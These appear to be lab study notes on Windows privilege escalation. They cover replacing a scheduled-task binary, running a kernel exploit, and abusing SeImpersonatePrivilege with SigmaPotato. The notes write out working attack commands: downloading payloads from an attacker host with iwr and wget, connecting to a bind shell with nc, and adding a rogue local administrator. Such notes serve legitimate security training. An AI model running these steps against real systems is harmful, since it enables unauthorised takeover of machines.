### Scheduled Tasks

Identify privilege escalation vector for scheduled task by asking...

- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

##### Scenario

Privilege escalation by replacing a binary

View scheduled tasks on Windows:
- `
`
- `schtasks /query`

Display a list of all scheduled tasks on CLIENTWK220

`schtasks /query /fo LIST /v`

Seek interesting info in the fields
- _Author_
- _TaskName_
- _Task To Run_
- _Run As User_
- _Next Run Time_

Task `BackendCacheCleanup.exe` executes every minute as daveadmin 

Checking our permissions (as steve) on the executable with #icacls 

`icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`

Result:

````
CLIENTWK220\steve:(I)(F)
````

We do have full access to the executable. 

Use our binary **adduser.exe** again to replace the executable file

Start #pythonhttpserver to serve up adduser.exe

Download with #iwr onto target

`iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe`

Move `BackendCacheCleanup.exe` to our home directory to restore it after privilege escalation. 

Replace original `BackendCacheCleanup.exe` with our malicious exe

`move .\BackendCacheCleanup.exe .\Pictures\`

When scheduled task executes again , we should have our new admin user. 

### Using Exploits 

#### Exploit Application-Based Vulnerabilities

If apps run with administrative permissions, we can exploit a vulnerability that leads to code execution

#### Exploit Windows Kernel Vulnerabilities 

##### Scenario

Logging in over RDP as steve and checking our current privileges

`whoami /priv`

Result: no special privvies

```
Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Enumerate Windows version

Kernel exploit:

```
CVE-2023-29360.exe
```

Executing this as Steve user, elevates us to nt authority /system

#### Exploit Certain Windows Privileges

Privileges that could lead to privilege escalation:
- _SeImpersonatePrivilege_
- _SeBackupPrivilege_
- _SeAssignPrimaryToken_
- _SeLoadDriver_
- _SeDebug_

Non-privileged users with _SeImpersonatePrivilege_ can abuse this for privilege escalation.

Users with _SeImpersonatePrivilege_ can leverage a token with another security context. Typically admins have this privilege. Service accounts also may have this privilege. 

##### Scenario: 

Coerce Privileged Process NT AUTHORITY\SYSTEM 

(_SeImpersonatePrivilege_) to connect to our controlled named pipe.

Tool:  [_SigmaPotato_](https://github.com/tylerdotrar/SigmaPotato)

[[Potatoes]]

Connecting to bind shell as Dave

`nc 192.168.50.220 4444`

Display his privileges

`whoami /priv`

Result: he does have _SeImpersonatePrivilege_

```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

Attempt to priv esc using _Sigma Potato_

On Kali box, download _Sigma Potato_

`wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe`

Serve up with #pythonhttpserver 

`python3 -m http.server 80`

Back on the bind shell, start PowerShell session

`powershell`

Download #sigmapotato with #iwr

`iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe`

`SigmaPotato.exe` allows us to execute commands as _NT AUTHORITY\SYSTEM_ 

Using net user to add a new user to the _Administrators_ group.

`.\SigmaPotato "net user dave4 lab /add"`

`.\SigmaPotato "net localgroup Administrators dave4 /add"`

Verifying user add:

`net localgroup Administrators`

### Additional method:

Privileged File Writes
